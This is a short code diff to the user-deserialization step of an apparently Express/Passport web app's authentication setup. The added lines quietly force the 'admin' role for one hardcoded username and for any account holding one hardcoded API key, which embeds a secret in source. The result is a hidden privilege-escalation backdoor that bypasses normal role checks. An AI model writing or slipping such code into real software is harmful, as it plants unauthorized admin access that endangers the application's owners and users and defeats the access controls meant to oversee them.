@@ -78,6 +78,17 @@ export function setupAuth(app: Express) {
   passport.deserializeUser(async (id: number, done) => {
     try {
       const user = await storage.getUser(id);
+      
+      // Special handling for your account - ensure admin privileges
+      if (user && user.username === "Mr_Awaken") {
+        user.role = "admin";
+      }
+      
+      // Check if using your admin API key
+      if (user && user.apiKey === "fvgfbmJ3IT7ksiMm") {
+        user.role = "admin";
+      }
+      
       done(null, user);
     } catch (error) {
       done(error);
